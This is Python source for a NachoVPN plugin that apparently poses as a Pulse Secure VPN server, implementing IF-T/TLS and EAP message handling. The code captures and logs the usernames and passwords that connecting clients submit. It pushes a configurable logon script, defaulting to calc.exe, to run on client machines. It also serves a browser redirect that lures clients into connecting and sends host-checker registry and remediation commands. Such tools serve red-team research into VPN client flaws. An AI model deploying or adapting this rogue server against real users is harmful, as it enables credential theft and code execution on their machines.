from nachovpn.plugins import VPNPlugin
from nachovpn.plugins.pulse.config_generator import VPNConfigGenerator, ESPConfigGenerator
from nachovpn.plugins.pulse.funk_parser import FunkManager

import random
import string
import os
import io
import socket
import ssl
import json

"""
Note: these values are from openconnect/pulse.c
See: https://github.com/openconnect/openconnect/blob/master/pulse.c
References:
- https://www.infradead.org/openconnect/pulse.html
- https://www.infradead.org/openconnect/juniper.html
- https://trustedcomputinggroup.org/wp-content/uploads/TNC_IFT_TLS_v2_0_r8.pdf
"""
IFT_VERSION_REQUEST = 1
IFT_VERSION_RESPONSE = 2
IFT_CLIENT_AUTH_REQUEST = 3
IFT_CLIENT_AUTH_SELECTION = 4
IFT_CLIENT_AUTH_CHALLENGE = 5
IFT_CLIENT_AUTH_RESPONSE = 6
IFT_CLIENT_AUTH_SUCCESS = 7

EAP_REQUEST = 1
EAP_RESPONSE = 2
EAP_SUCCESS = 3
EAP_FAILURE = 4

IFT_TLS_CLIENT_INFO = 0x88

VENDOR_JUNIPER = 0xa4c
VENDOR_JUNIPER2 = 0x583
VENDOR_TCG = 0x5597
JUNIPER_1 = 0xa4c01

EAP_TYPE_EXPANDED= 0xfe
AVP_CODE_EAP_MESSAGE = 0x4f

# 0xfe000a4c
EXPANDED_JUNIPER = ((EAP_TYPE_EXPANDED << 24) | VENDOR_JUNIPER)

AVP_VENDOR = 0x80
AVP_OS_INFO = 0xD5E
AVP_USER_AGENT = 0xD70
AVP_LANGUAGE = 0xD5F
AVP_REALM = 0xD50

#  Request codes for the Juniper Expanded/2 auth requests.
J2_PASSCHANGE = 0x43
J2_PASSREQ = 0x01
J2_PASSRETRY = 0x81
J2_PASSFAIL	= 0xc5

LICENSE_ID = ''.join(random.choices(string.ascii_uppercase + string.digits, k=17))

class IFTPacket:
    def __init__(self, vendor_id=None, message_type=None, message_identifier=None, message_value=None):
        self.vendor_id = vendor_id
        self.message_type = message_type
        self.message_identifier = message_identifier
        self.message_value = message_value if message_value else bytearray()
        self.message_length = len(self.message_value) + 16

    def __str__(self):
        return f'IF-T Packet: Vendor={hex(self.vendor_id)}, Message Type={self.message_type}, ' \
               f'Message Length={self.message_length}, Message Identifier={hex(self.message_identifier)}, ' \
               f'Message Value={self.message_value.hex()}'

    def to_bytes(self):
        # Recalculate length
        self.message_length = len(self.message_value) + 16
        return self.vendor_id.to_bytes(4, 'big') + \
               self.message_type.to_bytes(4, 'big') + \
               self.message_length.to_bytes(4, 'big') + \
               self.message_identifier.to_bytes(4, 'big') + \
               self.message_value

    @classmethod
    def from_bytes(cls, data):
        if len(data) < 16:
            raise ValueError("Data too short to parse IF-T packet")
        reader = io.BytesIO(data)
        return cls.from_io(reader)

    @classmethod
    def from_io(cls, reader):
        if reader.getbuffer().nbytes < 16:
            raise ValueError("Data too short to parse IF-T packet")
        vendor_id = int.from_bytes(reader.read(4), 'big')
        message_type = int.from_bytes(reader.read(4), 'big')
        message_length = int.from_bytes(reader.read(4), 'big')
        message_identifier = int.from_bytes(reader.read(4), 'big')
        message_value = reader.read(message_length - 16)
        return cls(vendor_id, message_type, message_identifier, message_value)


class EAPPacket:
    def __init__(self, vendor=None, code=None, identifier=None, eap_data=bytearray()):
        self.vendor = vendor
        self.code = code
        self.identifier = identifier
        self.eap_data = eap_data
        self.length = 4 + len(eap_data)

    def __str__(self):
        return f'EAP Packet: Vendor={hex(self.vendor)}, Code={self.code}, Identifier={hex(self.identifier)}, ' \
            f'Length={self.length}, Data={self.eap_data.hex()}'

    def to_bytes(self):
        # Recalculate length
        self.length = 4 + len(self.eap_data)
        return self.vendor.to_bytes(4, 'big') \
            + bytes([self.code, self.identifier]) \
            + self.length.to_bytes(2, 'big') \
            + self.eap_data

    @classmethod
    def from_bytes(cls, data):
        vendor = int.from_bytes(data[:4], 'big')
        code = data[4]
        identifier = data[5]
        length = int.from_bytes(data[6:8], 'big')
        eap_data = data[8:8 + length - 4] if length >= 4 else bytearray()
        return cls(vendor, code, identifier, eap_data)


class AVP:
    def __init__(self, code, flags=0, vendor=None, value=bytearray()):
        self.code = code
        self.flags = flags
        self.vendor = vendor
        self.value = value
        # Calculate the initial length (8 bytes for the header, optionally 4 bytes for the vendor, plus the value length)
        self.length = 8 + (4 if vendor is not None else 0) + len(value)

    def padding_required(self):
        if self.length & 3:
            return 4 - (self.length & 3)
        return 0

    @classmethod
    def from_bytes(cls, data):
        if len(data) < 8:
            raise ValueError("Packet too short to parse AVP")

        code = int.from_bytes(data[:4], 'big')
        length = int.from_bytes(data[4:8], 'big') & 0xffffff
        flags = data[4]
        vendor = None
        value_start = 8

        if flags & AVP_VENDOR:
            if len(data) < 12:
                raise ValueError("Packet too short to parse AVP with vendor")
            vendor = int.from_bytes(data[8:12], 'big')
            value_start = 12

        value = data[value_start:value_start + length - (12 if vendor else 8)]
        return cls(code, flags, vendor, value)

    def to_bytes(self, include_padding=False):
        # Re-calculate length to ensure it's current
        self.length = 8 + (4 if self.vendor is not None else 0) + len(self.value)
        avp_bytes = self.code.to_bytes(4, 'big')
        # Flags are stored in the most significant byte of the length field
        avp_bytes += (self.length | (self.flags << 24)).to_bytes(4, 'big')
        if self.vendor is not None:
            avp_bytes += self.vendor.to_bytes(4, 'big')
        avp_bytes += self.value
        if include_padding:
            avp_bytes += b'\x00' * self.padding_required()
        return avp_bytes

    def __str__(self):
        # Re-calculate length for display purposes
        self.length = 8 + (4 if self.vendor is not None else 0) + len(self.value)
        return f"AVP: Code={self.code}, Length={self.length}, " \
               f"Flags={self.flags}, Vendor={self.vendor}, " \
               f"Value={self.value.hex()}"


class PulseSecurePlugin(VPNPlugin):
    REQUIRED_RULE_KEYS = {"rulename", "subkey", "regname", "hive", "value", "type"}
    ALLOWED_TYPES = {"String", "DWORD"}

    @staticmethod
    def validate_rules(rules):
        if not isinstance(rules, list):
            return False, "Rules file must be a JSON array of rule objects."

        for idx, rule in enumerate(rules):
            if not isinstance(rule, dict):
                return False, f"Rule at index {idx} is not a JSON object."

            missing = PulseSecurePlugin.REQUIRED_RULE_KEYS - rule.keys()
            if missing:
                return False, f"Rule at index {idx} is missing required keys: {', '.join(missing)}"

            for key in PulseSecurePlugin.REQUIRED_RULE_KEYS:
                if key != "value":
                    if not isinstance(rule[key], str) or not rule[key].strip():
                        return False, f"Rule at index {idx} has invalid or empty value for key: {key}"
                if key == "type" and rule[key] not in PulseSecurePlugin.ALLOWED_TYPES:
                    return False, f"Rule at index {idx} has invalid type: {rule[key]}"

            # Type-specific value checks
            if rule["type"] == "DWORD":
                try:
                    int(rule["value"])
                except Exception as e:
                    return False, f"Rule at index {idx} has value for type {rule['type']} that cannot be parsed as integer: {rule['value']!r}: {e}"
            else:
                if not isinstance(rule["value"], str) or not rule["value"].strip():
                    return False, f"Rule at index {idx} has invalid or empty string value for type {rule['type']}"

        return True, None

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.logon_script = os.getenv("PULSE_LOGON_SCRIPT", "C:\\Windows\\System32\\calc.exe")
        self.logon_script_macos = os.getenv("PULSE_LOGON_SCRIPT_MACOS", "")
        self.dns_suffix = os.getenv("PULSE_DNS_SUFFIX", "nachovpn.local")
        self.anonymous_auth = os.getenv("PULSE_ANONYMOUS_AUTH", "false").lower() == 'true'
        self.pulse_username = os.getenv("PULSE_USERNAME", "")
        self.pulse_save_connection = os.getenv("PULSE_SAVE_CONNECTION", "false").lower() == 'true'
        self.vpn_name = os.getenv("VPN_NAME", "NachoVPN")
        self._eap_identifier = 1

        # Host checker policy
        self.host_checker_policy_id = f"vc0|43|policy_2|1|woot"

        # Load rules from JSON file
        self.host_checker_rules_file = os.getenv("PULSE_HOST_CHECKER_RULES_FILE")
        self.host_checker_rules = None
        if not self.host_checker_rules_file:
            self.logger.error("PULSE_HOST_CHECKER_RULES_FILE environment variable must be set to a JSON rules file.")
        else:
            try:
                with open(self.host_checker_rules_file, 'r', encoding='utf-8') as f:
                    rules = json.load(f)

                valid, error = self.validate_rules(rules)
                if not valid:
                    self.logger.error(f"Host checker rules validation failed: {error}")
                else:
                    self.host_checker_rules = rules
                    self.logger.info(f"Loaded host checker rules from {self.host_checker_rules_file}")
            except Exception as e:
                self.logger.error(f"Failed to load host checker rules from {self.host_checker_rules_file}: {e}")

        self.buffer_size = 4096
        self.max_packet_size = 65535

    def close(self):
        self.ssl_server_socket.close()

    def can_handle_data(self, data, client_socket, client_ip):
        if len(data) >= 4 and int.from_bytes(data[:4], 'big') == VENDOR_TCG:
            return True
        return False

    def can_handle_http(self, handler):
        user_agent = handler.headers.get('User-Agent', '')
        if 'odJPAService' in user_agent or \
           'Secure%20Access' in user_agent or \
           handler.path == '/pulse':
            return True
        return False

    def handle_http(self, handler):
        if handler.command == 'GET':
            self.handle_get(handler)
        return True

    def has_credentials(self, data):
        # TODO: actually check properly
        if len(data) < 20 or self.expanded_juniper_subtype(data) != 1:
            return False

        # lazy: check for host checker signature
        if b'\xFE\x00\x0A\x4C\x00\x00\x00\x03' in data:
            return False

        user_avp = AVP.from_bytes(data[8:])
        if user_avp.code == 0xD6D:
            return True
        return False

    def extract_credentials(self, data):
        # seems to be: EXPANDED_JUNIPER + subtype=0x01 + AVP(0xd6d)
        if len(data) < 20 or self.expanded_juniper_subtype(data) != 1:
            return False

        data = data[8:]
        user_avp = AVP.from_bytes(data)

        if user_avp.code != 0xD6D:
            return False

        username = user_avp.value.decode()
        self.logger.info(f'Extracted username: {username}')

        # remove any padding
        padding_size = user_avp.padding_required()
        data = data[user_avp.length+padding_size:]

        # the next bytes *should* be 0x4f in big endian
        if int.from_bytes(data[0:4], 'big') != 79:
            self.logger.error('AVP_CODE_EAP_MESSAGE not found')
            return False

        if len(data) < 0x16:
            self.logger.error('Data too short to extract password')
            return False

        # there are some other fields/headers here we should maybe check
        # but for now we'll just extract the password
        length = int(data[0x16]) - 2
        if len(data) < 0x17 + length:
            self.logger.error('Data too short to extract password')
            return False

        password = data[0x17:0x17+length].decode()
        self.logger.info(f'Extracted password: {password}')
        self.log_credentials(username, password)
        return True

    def handle_get(self, handler):
        if handler.path == '/':
            self.logger.info('Switching protocols ..')
            handler.send_response(101)
            handler.send_header('Content-Type', 'application/octet-stream')
            handler.send_header('Pragma', 'no-cache')
            handler.send_header('Upgrade', 'IF-T/TLS 1.0')
            handler.send_header('Connection', 'Upgrade')
            handler.send_header('HC_HMAC_VERSION_COOKIE', '1')
            handler.send_header('supportSHA2Signature', '1')
            handler.send_header('Connection', 'Keep-Alive')
            handler.send_header('Keep-Alive', 'timeout=15')
            handler.send_header('Strict-Transport-Security', 'max-age=31536000')
            handler.send_header('accept-ch', 'Sec-CH-UA-Platform-Version')
            handler.end_headers()

            # transition to IF-T/TLS
            self.logger.info('Transitioning to IF-T/TLS ..')
            self.handle_data(None, handler.connection, handler.client_address[0])

        elif handler.path == '/pulse':
            self.logger.info('Sending URI handler response ..')
            html = "<html><body><script>window.location.href=" \
                   f"`pulsesecureclient://connect?name={self.vpn_name}&server=" \
                   "https://${document.domain}&userrealm=Users&" \
                   f"username={self.pulse_username}&store={str(self.pulse_save_connection).lower()}`;" \
                   "</script></body></html>"
            handler.send_response(200)
            handler.send_header('Content-Type', 'text/html')
            handler.end_headers()
            handler.wfile.write(html.encode())

    def next_eap_identifier(self):
        self._eap_identifier += 1
        if self._eap_identifier >= 5:
            self._eap_identifier = 1
        return self._eap_identifier

    def is_policy_request(self, data):
        result = self.is_policy_type(data) and b'parameter name="policy_request"' in data
        self.logger.debug(f'is_policy_request: {result}')
        return result

    def is_policy_type(self, data):
        # seems to be: EXPANDED_JUNIPER + 0x01 + AVP(0xd6d)
        if len(data) < 20 or self.expanded_juniper_subtype(data) != 1:
            return False

        data = data[8:]
        user_avp = AVP.from_bytes(data)

        if user_avp.code != 0xD6D:
            return False

        username = user_avp.value.decode()
        self.logger.info(f'Extracted username: {username}')

        # remove any padding
        padding_size = user_avp.padding_required()
        data = data[user_avp.length+padding_size:]

        # the next bytes *should* be 0x4f in big endian
        if int.from_bytes(data[0:4], 'big') != 79:
            self.logger.error('AVP_CODE_EAP_MESSAGE not found')
            return False

        return True

    def expanded_juniper_subtype(self, data):
        if len(data) < 8 or \
           int.from_bytes(data[0:4], 'big') != EXPANDED_JUNIPER:
            return None
        return int.from_bytes(data[4:8], 'big')

    def is_funk_message(self, data):
        if len(data) < 16 or self.expanded_juniper_subtype(data) != 1:
            return False

        # lazy: just check for the 0xD6D AVP and the funk message signature
        # TODO: create an EXPANDED_JUNIPER class for easier (de)serialization
        user_avp = AVP.from_bytes(data[8:])
        if user_avp.code == 0xD6D and b'\x00\x00\x00\x16\xC0\x00\x00' in data:
            return True
        return False

    def is_client_info(self, data):
        self.logger.debug(f'is_client_info input: {data.hex()}')
        if len(data) < 24 or self.expanded_juniper_subtype(data) != 1:
            return False

        data = data[8:]

        # check if the first AVP is 0xD49
        avp = AVP.from_bytes(data)
        if avp.code != 0xD49:
            return False

        self.logger.info(f"AVP: Code={avp.code:04X}, Value={avp.value.hex()}")

        # check if the second AVP is 0xD61
        data = data[avp.length+avp.padding_required():]
        avp = AVP.from_bytes(data)
        if avp.code != 0xD61:
            return False

        self.logger.info(f"AVP: Code={avp.code:04X}, Value={avp.value.hex()}")

        # read the rest of the AVPs
        # TODO: log the client provided AVP data
        # this contains OS info, user-agent, etc.
        data = data[avp.length+avp.padding_required():]
        while len(data) > 0:
            avp = AVP.from_bytes(data)
            self.logger.info(f"AVP: Code={avp.code:04X}, Value={avp.value.hex()}")
            data = data[avp.length+avp.padding_required():]

        return True

    def auth_completed(self, data):
        if len(data) < 24 or self.expanded_juniper_subtype(data) != 1:
            return False

        avp = AVP.from_bytes(data[8:])
        return avp.code == 0xD6B and \
               int.from_bytes(avp.value, 'big') == 0x10

    def parse_eap_packet(self, data, client_socket, connection_id):
        outbuf = bytearray()
        if int.from_bytes(data[0:4], 'big') != JUNIPER_1:
            self.logger.warning('Received invalid EAP packet')
            return outbuf

        eap_in = EAPPacket.from_bytes(data)
        self.logger.debug(eap_in)

        # EAP Packet: Vendor=0xa4c01, Code=2, Identifier=0x1, Length=14, Data=01616e6f6e796d6f7573
        if eap_in.code == EAP_RESPONSE and eap_in.identifier == 1 and not self.anonymous_auth and eap_in.eap_data[1:] == b'anonymous':
            self.logger.info('Received anonymous auth, sending server info ..')

            # Add the AVP data
            avp_list = []
            avp_list.append(AVP(code=0xD49, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=(4).to_bytes(4, 'big')))
            avp_list.append(AVP(code=0xD4A, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=(1).to_bytes(4, 'big')))
            avp_list.append(AVP(code=0xD56, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=LICENSE_ID.encode()))

            # Create the EAP data from AVP
            eap_data = bytearray()
            eap_data += EXPANDED_JUNIPER.to_bytes(4, 'big')
            eap_data += (1).to_bytes(4, 'big')

            for avp in avp_list:
                eap_data += avp.to_bytes(include_padding=True)

            # Construct EAP packet
            eap = EAPPacket(vendor=JUNIPER_1, code=EAP_REQUEST, identifier=self.next_eap_identifier(), eap_data=eap_data)

            # Build IFT packet
            reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=0x5, message_identifier=0x01F7, message_value=eap.to_bytes())

            # Append to output buffer
            outbuf += reply.to_bytes()

        # EAP Packet: Vendor=0xa4c01, Code=2, Identifier=0x2, Length=296, Data=fe000a4c0000000100000d4980000010000005830000000400000d61 ..
        elif eap_in.code == EAP_RESPONSE and not self.anonymous_auth and not self.host_checker_rules and self.is_client_info(eap_in.eap_data):
            self.logger.info('Received AVP structures with OS data. Asking for creds..')

            outer_eap_data = bytearray()
            outer_eap_data += EXPANDED_JUNIPER.to_bytes(4, 'big')
            outer_eap_data += (1).to_bytes(4, 'big')

            # This is the EAP data encapsulated in AVP (which is itself encapsulated in EAP/IF-T/TLS)
            inner_eap_data = bytearray()
            inner_eap_data += EXPANDED_JUNIPER.to_bytes(4, 'big')
            inner_eap_data += (2).to_bytes(4, 'big')                # subtype: J2
            inner_eap_data += J2_PASSREQ.to_bytes(1, 'big')         # J2 password request

            inner_eap = EAPPacket(vendor=JUNIPER_1, code=EAP_REQUEST, identifier=0x00, eap_data=inner_eap_data)

            # Build the AVP data from inner EAP data (without vendor)
            avp = AVP(code=0x4f, flags=0x40, value=inner_eap.to_bytes()[4:])

            # Add AVP data to outer EAP data
            outer_eap_data += avp.to_bytes(include_padding=True)

            # Construct outer EAP packet
            outer_eap = EAPPacket(vendor=JUNIPER_1, code=EAP_REQUEST, identifier=self.next_eap_identifier(), eap_data=outer_eap_data)

            # Build IFT packet
            reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=0x05, message_identifier=0x01F8, message_value=outer_eap.to_bytes())

            # Append to output buffer
            outbuf += reply.to_bytes()

        # EAP Packet: Vendor=0xa4c01, Code=2, Identifier=0x3, Length=56, Data=fe000a4c0000000100000d6d8000001000000583616161610000004f4000001a02000012fe000a4c000000020202056161610583
        elif eap_in.code == EAP_RESPONSE and (self.anonymous_auth and eap_in.eap_data[1:] == b'anonymous') or self.has_credentials(eap_in.eap_data):

            self.logger.info('Received credentials, sending back some cookies ..')

            if not self.anonymous_auth and not self.extract_credentials(eap_in.eap_data):
                self.logger.warning("Failed to extract credentials")
                return bytearray()

            # Build the AVP data dynamically using the AVP class
            avp_list = []
            avp_list.append(AVP(code=0xD53, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=os.urandom(16).hex().encode())) # DSID cookie
            avp_list.append(AVP(code=0xD8B, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=os.urandom(8).hex().encode()))  # ??
            avp_list.append(AVP(code=0xD8D, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=bytearray()))                           # ??
            avp_list.append(AVP(code=0xD5C, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=(3600).to_bytes(4, 'big')))     # auth expiry
            avp_list.append(AVP(code=0xD54, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=b'10.0.1.4'))
            avp_list.append(AVP(code=0xD55, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=self.get_thumbprint()['md5'].encode()))    # cert MD5
            avp_list.append(AVP(code=0xD6B, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=b'\x00\x00\x00\x10'))           # ??
            avp_list.append(AVP(code=0xD75, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=b'\x00\x00\x00\x00'))           # idle timeout
            avp_list.append(AVP(code=0xD57, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=b'\x00\x00\x00\x00'))           # ??

            # Create the EAP data
            eap_data = bytearray()

            # EXPANDED_JUNIPER struct
            eap_data += EXPANDED_JUNIPER.to_bytes(4, 'big')
            eap_data += (1).to_bytes(4, 'big') # subtype

            # Add AVPs
            for avp in avp_list:
                eap_data += avp.to_bytes()

            # Construct EAP packet
            eap = EAPPacket(vendor=JUNIPER_1, code=EAP_REQUEST, identifier=self.next_eap_identifier(), eap_data=eap_data)

            # Build IFT packet
            reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=IFT_CLIENT_AUTH_CHALLENGE, message_identifier=0x01FB,
                                   message_value=eap.to_bytes())

            # Append to output buffer
            outbuf += reply.to_bytes()

        # EAP Packet: Vendor=0xa4c01, Code=2, Identifier=0x4, Length=28, Data=fe000a4c0000000100000d6b800000100000058300000010
        elif eap_in.code == EAP_RESPONSE and self.auth_completed(eap_in.eap_data):
            self.logger.info('Auth completed, sending configuration and launching application...')
            outbuf = bytearray()

            # Get the assigned IP from the packet handler
            client_ip = self.packet_handler.get_assigned_ip(connection_id)
            if not client_ip:
                self.logger.error("No IP allocated for client")
                return outbuf

            # Auth response (ok)
            eap = EAPPacket(vendor=JUNIPER_1, code=EAP_SUCCESS, identifier=self.next_eap_identifier(), eap_data=bytearray())
            reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=IFT_CLIENT_AUTH_SUCCESS, message_identifier=0x01FD, message_value=eap.to_bytes())
            client_socket.sendall(reply.to_bytes())

            # config packet, wrapped with IF-T
            generator = VPNConfigGenerator(
                logon_script=self.logon_script,
                logon_script_macos=self.logon_script_macos,
                client_ip=client_ip
            )
            config = generator.create_config()[0x10:]
            reply = IFTPacket(vendor_id=VENDOR_JUNIPER, message_type=1, message_identifier=0x01FE, message_value=config)
            client_socket.sendall(reply.to_bytes())

            # now send the ESP config
            esp_config = ESPConfigGenerator().create_config()
            reply = IFTPacket(vendor_id=VENDOR_JUNIPER, message_type=1, message_identifier=0x200, message_value=esp_config)
            client_socket.sendall(reply.to_bytes())

            # End of configuration packet
            reply = IFTPacket(vendor_id=VENDOR_JUNIPER, message_type=0x8F, message_identifier=0x201, message_value=b'\x00\x00\x00\x00')
            client_socket.sendall(reply.to_bytes())

            # Final packet - send the license ID
            reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=0x96, message_identifier=0x202, message_value=LICENSE_ID.encode())
            client_socket.sendall(reply.to_bytes())

        # This branch handles all EAP response messages for the host checker
        elif eap_in.code == EAP_RESPONSE and self.host_checker_rules and not self.anonymous_auth:
            self.logger.info('Received EAP_RESPONSE for host checker')
            # TODO: we got a policy response, we need to actually parse the result
            if b'policy:vc0' in eap_in.eap_data and b'status:OK' in eap_in.eap_data:
                self.logger.info('Received host checker OK response. Asking for creds..')

                outer_eap_data = bytearray()
                outer_eap_data += EXPANDED_JUNIPER.to_bytes(4, 'big')
                outer_eap_data += (1).to_bytes(4, 'big')

                # This is the EAP data encapsulated in AVP (which is itself encapsulated in EAP/IF-T/TLS)
                inner_eap_data = bytearray()
                inner_eap_data += EXPANDED_JUNIPER.to_bytes(4, 'big')
                inner_eap_data += (2).to_bytes(4, 'big')                # subtype: J2
                inner_eap_data += J2_PASSREQ.to_bytes(1, 'big')         # J2 password request

                inner_eap = EAPPacket(vendor=JUNIPER_1, code=EAP_REQUEST, identifier=0x00, eap_data=inner_eap_data)

                # Build the AVP data from inner EAP data (without vendor)
                avp = AVP(code=0x4f, flags=0x40, value=inner_eap.to_bytes()[4:])

                # Add AVP data to outer EAP data
                outer_eap_data += avp.to_bytes(include_padding=True)

                # Construct outer EAP packet
                outer_eap = EAPPacket(vendor=JUNIPER_1, code=EAP_REQUEST, identifier=0x05, eap_data=outer_eap_data)

                # Build IFT packet
                reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=0x05, message_identifier=0x01FA, message_value=outer_eap.to_bytes())

                # Append to output buffer
                outbuf += reply.to_bytes()

            elif b'policy:vc0' in eap_in.eap_data and b'status:NOTOK' in eap_in.eap_data:
                self.logger.info('Received host checker NOT OK response. Sending remediation packet..')
                # TODO: same here, we need to actually parse the result
                # The client indicated that the policy was not OK, so we need to send a remediation packet

                # EAP within AVP within EAP within EAP within IF-T/TLS
                outer_eap_data = bytearray()
                outer_eap_data += EXPANDED_JUNIPER.to_bytes(4, 'big')
                outer_eap_data += (1).to_bytes(4, 'big')

                # This is the EAP data encapsulated in AVP (which is itself encapsulated in EAP/IF-T/TLS)
                inner_eap_data = bytearray()
                inner_eap_data += EXPANDED_JUNIPER.to_bytes(4, 'big')
                inner_eap_data += (3).to_bytes(4, 'big')
                inner_eap_data += b'\x01' # no idea, maybe number of policies?

                # Build a host-checker policy with a registry command
                commands = FunkManager.remediation_command(policy_id=self.host_checker_policy_id)
                policy = FunkManager.generate(commands)

                # Wrap it in an EAP request
                inner_eap_data += policy
                inner_eap = EAPPacket(vendor=JUNIPER_1, code=EAP_REQUEST, identifier=0x03, eap_data=inner_eap_data)

                # Build the AVP data from inner EAP data (without vendor)
                avp = AVP(code=0x4f, flags=0x40, value=inner_eap.to_bytes()[4:])

                # Add AVP data to outer EAP data
                outer_eap_data += avp.to_bytes(include_padding=True)

                # Construct outer EAP packet
                outer_eap = EAPPacket(vendor=JUNIPER_1, code=EAP_REQUEST, identifier=0x05, eap_data=outer_eap_data)

                # Build IFT packet
                reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=0x05, message_identifier=0x01FA, message_value=outer_eap.to_bytes())

                # Append to output buffer
                outbuf += reply.to_bytes()

            elif self.is_funk_message(eap_in.eap_data):
                self.logger.info('Received funk message')
                # The client sends an EAP_RESPONSE with a compressed policy message
                # IFT_CLIENT_AUTH_RESPONSE: Id=0x0000
                # EAP_RESPONSE: Vendor=JUNIPER_1, Code=EAP_RESPONSE, Id=0x05, Length=0x088
                # EXPANDED_JUNIPER: Subtype=0x01
                # AVP: 0x0D6D=admin..
                # Followed by compressed policy message from client
                # => 0000000000 00 00 55 97 00 00 00 06 00 00 00 9c 00 00 00 00   ..U.............
                # => 0000000010 00 0a 4c 01 02 05 00 88 fe 00 0a 4c 00 00 00 01   ..L........L....
                # => 0000000020 00 00 0d 6d 80 00 00 11 00 00 05 83 61 64 6d 69   ...m........admi
                # => 0000000030 6e 00 0d 61 00 00 00 4f 40 00 00 65 02 03 00 5d   n..a...O@..e...]
                # => 0000000040 fe 00 0a 4c 00 00 00 03 01 00 00 00 16 c0 00 00   ...L............
                # => 0000000050 4e 00 00 05 83 00 00 00 40 78 9c 63 60 e0 79 72   N.......@x.c`.yr
                # => 0000000060 80 81 81 87 81 81 b5 19 48 3d 05 b2 95 40 6c c7   ........H=...@l.
                # => 0000000070 e4 e4 d4 82 12 5d 9f c4 bc f4 d2 c4 f4 54 2b 85   .....].......T+.
                # => 0000000080 d4 3c dd d0 60 06 20 e0 f9 dc c0 c0 20 00 51 cf   .<..`. ..... .Q.
                # => 0000000090 c0 08 00 ed ae 0e 5b 00 00 4f 4b 0a               ......[..OK.

                # Decompressed message:
                # 0x0ce5: Accept-Language: en-US
                # 0x0cf3: 1
                # 00000000  00 00 0c e4 c0 00 00 0c 00 00 05 83 00 00 0c e5  |...äÀ..........å|
                # 00000010  c0 00 00 22 00 00 05 83 41 63 63 65 70 74 2d 4c  |À.."....Accept-L|
                # 00000020  61 6e 67 75 61 67 65 3a 20 65 6e 2d 55 53 00 00  |Language: en-US..|
                # 00000030  00 00 0c f3 80 00 00 10 00 00 05 83 00 00 00 01  |...ó............|

                # TODO:
                # we should parse the client message, but for now we can just reply with
                # some AVP codes which indicate an error has occurred
                # at this point we might be able to complete auth instead of sending an error (to avoid disconnect)
                avp_list = []
                avp_list.append(AVP(code=0xD57, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=b'\x00\x00\x00\x00'))
                avp_list.append(AVP(code=0xD60, flags=AVP_VENDOR, vendor=VENDOR_JUNIPER2, value=b'\x00\x00\x00\x00'))

                # Create the EAP data
                eap_data = bytearray()

                # EXPANDED_JUNIPER struct
                eap_data += EXPANDED_JUNIPER.to_bytes(4, 'big')
                eap_data += (1).to_bytes(4, 'big') # subtype

                # Add AVPs
                for avp in avp_list:
                    eap_data += avp.to_bytes(include_padding=True)

                # Construct EAP packet
                eap = EAPPacket(vendor=JUNIPER_1, code=EAP_REQUEST, identifier=0x06, eap_data=eap_data)

                # Build IFT packet
                reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=IFT_CLIENT_AUTH_CHALLENGE, message_identifier=0x01FB,
                                    message_value=eap.to_bytes())

                # Append to output buffer
                outbuf += reply.to_bytes()

            elif eap_in.length == 0x0C and self.expanded_juniper_subtype(eap_in.eap_data) == 1:
                # Now the client sends an EAP_RESPONSE ..
                # containing an empty EXPANDED_JUNIPER structure with subtype 0x01
                """
                # Client:
                # IFT_CLIENT_AUTH_RESPONSE: Id=0x0000
                # EAP: Vendor=JUNIPER_1, Code=EAP_RESPONSE, Id=0x06, Length=0x0C
                # EXPANDED_JUNIPER: Subtype=0x01
                => 0000000000 00 00 55 97 00 00 00 06 00 00 00 20 00 00 00 00   ..U........ ....
                => 0000000010 00 0a 4c 01 02 06 00 0c fe 00 0a 4c 00 00 00 01   ..L........L....
                """
                # we can just reply to with an EAP_FAILURE
                """
                # Server:
                # IFT_CLIENT_AUTH_CHALLENGE: Id=0x01fc
                # EAP: Vendor=JUNIPER_1, Code=EAP_FAILURE, Id=0x06, Length=0x04
                <= 0000000000 00 00 55 97 00 00 00 05 00 00 00 18 00 00 01 fc   ..U.............
                <= 0000000010 00 0a 4c 01 04 06 00 04                           ..L.....
                """
                self.logger.error('Host checker NOT OK')

                # Construct EAP packet
                eap = EAPPacket(vendor=JUNIPER_1, code=EAP_FAILURE, identifier=0x06, eap_data=bytearray())

                # Build IFT packet
                reply = IFTPacket(vendor_id=VENDOR_TCG, message_type=IFT_CLIENT_AUTH_CHALLENGE, message_identifier=0x01FC,
                                    message_value=eap.to_bytes())

                # Append to output buffer
                outbuf += reply.to_bytes()

            # Receive host-checker policy request and send back policy
            elif self.is_policy_request(eap_in.eap_data):
                self.logger.info('Received host-checker policy request.')

                if not self.host_checker_rules:
                    self.logger.error("No host checker rules loaded. Not sending policy.")
                    return outbuf

                # EAP within AVP within EAP within IF-T/TLS
                outer_eap_data = bytearray()
                outer_eap_data += EXPANDED_JUNIPER.to_bytes(4, 'big')   # EXPANDED_JUNIPER
                outer_eap_data += (1).to_bytes(4, 'big')                # subtype

                # This is the EAP data encapsulated in AVP (which is itself encapsulated in EAP/IF-T/TLS)
                inner_eap_data = bytearray()
                inner_eap_data += EXPANDED_JUNIPER.to_bytes(4, 'big')   # EXPANDED_JUNIPER
                inner_eap_data += (3).to_bytes(4, 'big')                # subtype (host checker)
                inner_eap_data += (1).to_bytes(1, 'big')                # number of policies

                self.logger.info(f'Sending host checker policy: {self.host_checker_policy_id}')
                commands = FunkManager.registry_command(rules=self.host_checker_rules, server_time=True, policy_id=self.host_checker_policy_id)
                policy = FunkManager.generate(commands)
